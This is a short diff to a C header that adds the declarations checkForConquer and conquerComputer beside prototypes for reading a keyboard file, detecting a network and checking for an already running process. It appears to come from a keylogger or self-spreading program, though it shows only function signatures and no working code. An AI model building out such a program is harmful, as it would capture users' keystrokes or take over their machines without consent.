@@ -23,5 +23,7 @@ void getKeyboardFile(char *);
 int openKeyboardFile(void);
 const bool isNetPresent(void);
 const bool processAlreadyRunning(void);
+const bool checkForConquer(void);
+void conquerComputer(const char *);
 
 #endif
